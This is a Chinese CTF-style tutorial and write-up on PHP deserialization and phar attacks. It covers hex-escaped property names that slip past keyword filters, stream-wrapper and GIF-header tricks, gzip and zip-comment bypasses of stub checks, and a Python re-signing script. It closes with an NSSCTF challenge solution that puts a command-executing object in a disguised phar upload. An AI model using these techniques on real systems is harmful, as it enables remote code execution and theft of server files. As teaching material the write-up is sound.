
### 16进制绕过字符的过滤

序列字符串中`**`表示字符类型的`s`大写时，会被当成16进制解析。`**`

举个栗子：

```php
<?php
class test{
public $username;
public function __construct(){
$this->username = 'admin';
}
public function __destruct(){
echo 'success';
}
}
function check($data){
if(preg_match('/username/', $data)){
echo("nonono!!!</br>");
}
else{
return $data;
}
}
// 未作处理前，会被waf拦截
$a = 'O:4:"test":1:{s:8:"username";s:5:"admin";}';
$a = check($a);
unserialize($a);
// 将小s改为大S; 做处理后 \75是u的16进制， 成功绕过
$a = 'O:4:"test":1:{S:8:"\\75sername";s:5:"admin";}';
$a = check($a);
unserialize($a);
```

输出

![图片描述](upload/attach/202209/952339_VP53SKSHRSWV995.png)

## phar反序列化

### 前言

有关phar的基本介绍及利用方法我以前有过总结 , <a href="elink@c19K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3j5h3&6C8j5i4y4Q4x3X3g2@1L8%4m8Q4x3V1j5J5x3o6t1J5i4K6u0r3x3o6c8Q4x3V1j5J5z5q4)9J5c8Y4m8Z5j5i4u0Q4x3U0g2q4y4g2)9J5y4e0S2r3i4K6t1#2z5p5c8Q4x3U0g2q4y4g2)9J5y4f1u0m8i4K6t1#2z5p5k6Q4x3U0g2q4y4g2)9J5y4e0R3^5i4K6t1#2z5e0N6Q4x3U0g2q4y4g2)9J5y4e0S2o6i4K6t1#2z5e0k6Q4x3U0g2q4y4g2)9J5y4f1q4p5i4K6t1#2b7e0k6Q4x3U0g2q4y4q4)9J5y4f1t1&6i4K6t1#2b7e0m8Q4x3U0g2q4y4#2)9J5y4f1q4o6i4K6t1#2z5e0c8Q4x3U0g2q4z5q4)9J5y4f1q4q4i4K6t1#2b7U0m8Q4x3V1j5`.">参考链接</a>

**同时应该重点关注<a href="elink@5e4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2H3K9s2m8Q4x3X3g2F1k6i4c8Q4x3V1k6E0j5h3&6#2j5h3I4Q4x3V1k6*7K9q4)9J5c8X3u0G2L8$3E0Q4x3X3g2H3K9r3q4J5i4K6u0W2M7r3S2H3">官方文档</a>中有关 phar 的介绍** (一定要关注官方文档，官方文档yyds)

这里重点对我以前的总结进行补充

### 生成phar

```php
<?php
class TestObject {
}
@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$o = new TestObject();
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
```

ps：注意phar中存储的对象反序列化之后会被phar对象的metadata属性引用

### 一些绕过方式

* 当环境限制了phar不能出现在前面的字符里。可以使用`compress.bzip2://`和`compress.zlib://`等绕过

```php
compress.bzip://phar:///test.phar/test.txt
compress.bzip2://phar:///test.phar/test.txt
compress.zlib://phar:///home/sx/test.phar/test.txt
```

* 也可以利用其它协议, 如 filter 过滤器

```php
php://filter/read=convert.base64-encode/resource=phar://phar.phar
```

* GIF格式验证可以通过在文件头部添加GIF89a绕过

```php
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub
//生成一个phar.phar，修改后缀名为phar.gif
```

* **过滤了`__HALT_COMPILER();`**

参考 <mark class="encrypted">eb6K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4N6h3!0C8k6i4W2S2i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2K9h3!0Q4x3V1k6H3L8%4y4@1i4K6u0r3N6i4S2%4d9p5I4U0K9%4N6^5</mark> （原理）

姿势1:

**将phar文件进行gzip压缩** ，使用压缩后phar文件同样也能反序列化 (常用)

​ linux下使用命令`gzip phar.phar` 生成

姿势2：

将phar的内容写进压缩包注释中，也同样能够反序列化成功，压缩为zip也会绕过

```php
$phar_file = serialize($exp);
echo $phar_file;
$zip = new ZipArchive();
$res = $zip->open('1.zip',ZipArchive::CREATE);
$zip->addFromString('crispr.txt', 'file content goes here');
$zip->setArchiveComment($phar_file);
$zip->close();
```

### phar 文件签名修改

对于某些情况，我们需要修改phar文件中的内容而达到某些需求(比如要绕过`__wakeup`要修改属性数量)，而修改后的phar文件由于文件发生改变，所以须要修改签名才能正常使用，官方文档中是这么说：

**<a href="elink@932K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2H3K9s2m8Q4x3X3g2F1k6i4c8Q4x3V1k6E0j5h3&6#2j5h3I4Q4x3V1k6*7K9q4)9J5c8Y4m8Z5j5i4u0Q4x3X3g2X3K9h3I4W2k6X3!0J5L8h3q4@1i4K6u0W2M7$3W2Y4L8X3q4@1N6i4u0W2i4K6u0W2M7r3S2H3i4K6t1K6M7r3S2S2M7W2)9J5k6h3k6A6L8r3g2X3L8%4u0E0j5i4c8Q4x3X3g2K6K9h3N6F1j5i4c8#2M7X3f1`.">Phar Signature format</a>**

Phars containing a signature always have the signature appended to the **end of** the Phar archive after the loader, manifest, and file contents. The signature formats supported at this time are MD5, SHA1, SHA256, SHA512, and OPENSSL.

| Length in bytes | Description |
| :-------------- | :----------------------------------------------------------- |
| varying | The actual signature, **20 bytes for an SHA1 signature**, 16 bytes for an MD5 signature, 32 bytes for an SHA256 signature, and 64 bytes for an SHA512 signature. The length of an OPENSSL signature depends on the size of the private key.**（签名字节）** |
| 4 bytes | Signature flags. `0x0001` is used to define an MD5 signature, `0x0002` is used to define an SHA1 signature, `0x0003` is used to define an SHA256 signature, and `0x0004` is used to define an SHA512 signature. The SHA256 and SHA512 signature support is available as of API version 1.1.0. `0x0010` is used to define an OPENSSL signature, what is available as of API version 1.1.1, if OpenSSL is available.**（签名类型，1代表md5，2代表sha1，类推）** |
| 4 bytes | Magic `GBMB` used to define the presence of a signature. **（GBMB标识）** |

用winhex或010-editor查看phar文件签名类型（以上述代码生成的phar文件为例）

![图片描述](upload/attach/202209/952339_QWNV5KQH8HFSZN2.png)

以默认的sha1签名为例：

```python
from hashlib import sha1
with open('phar.phar', 'rb') as file:
f = file.read() # 修改内容后的phar文件,以二进制文件形式打开
s = f[:-28] # 获取要签名的数据（对于sha1签名的phar文件，文件末尾28字节为签名的格式）
h = f[-8:] # 获取签名类型以及GBMB标识，各4个字节
newf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB)
with open('newPhar.phar', 'wb') as file:
file.write(newf) # 写入新文件
```

运行脚本得到的 `newPhar.phar` 就可以正常使用啦

### 案例

题目来源：NSSCTF Round#4 Team-1zweb(revenge)

前面任意文件读取拿到源码就不说了，重点看它这个phar反序列化

index.php：

```php
<?php
class LoveNss{
public $ljt;
public $dky;
public $cmd;
public function __construct(){//__wakeup执行后__construct并不会执行
$this->ljt="ljt";
$this->dky="dky";
phpinfo();
}
public function __destruct(){
if($this->ljt==="Misc"&&$this->dky==="Re")
eval($this->cmd);
}
public function __wakeup(){//需要绕过__wakeup,更改序列化属性个数即可绕过
$this->ljt="Re";
$this->dky="Misc";
}
}
$file=$_POST['file'];
if(isset($_POST['file'])){
if (preg_match("/flag/i", $file)) {
die("nonono");
}
echo file_get_contents($file);
}
```

upload.php：

```php
<?php
if ($_FILES["file"]["error"] > 0){
echo "上传异常";
}
else{
$allowedExts = array("gif", "jpeg", "jpg", "png");
$temp = explode(".", $_FILES["file"]["name"]);
$extension = end($temp);
if ($_FILES["file"]["size"] && in_array($extension, $allowedExts)){
$content=file_get_contents($_FILES["file"]["tmp_name"]);
$pos = strpos($content, "__HALT_COMPILER();");//ban掉了明文的stub标识
if(gettype($pos)==="integer"){
echo "ltj一眼就发现了phar";
}else{
if (file_exists("./upload/" . $_FILES["file"]["name"])){
echo $_FILES["file"]["name"] . " 文件已经存在";
}else{
$myfile = fopen("./upload/".$_FILES["file"]["name"], "w");
fwrite($myfile, $content);
fclose($myfile);
echo "上传成功 ./upload/".$_FILES["file"]["name"];
}
}
}else{
echo "dky不喜欢这个文件 .".$extension;
}
}
?>
```

分析源码可知ban掉了 `__HALT_COMPILER();` 标识，没有这个是不认phar的，这个可以使用gzip压缩进行绕过

`__wakeup` 修改序列属性个数即可绕过，**注意修改完phar文件后还需重新签名**，用上文的脚本即可

生成phar：

```php
<?php
class LoveNss{
public $ljt;
public $dky;
public $cmd;
public function __construct($ljt, $dky, $cmd){
$this->ljt = $ljt;
$this->dky = $dky;
$this->cmd = $cmd;
}
}
@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$o = new LoveNss("Misc", "Re", "cat /flag");
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
```

修改签名并上传文件，访问后触发phar反序列化拿到flag

exp:
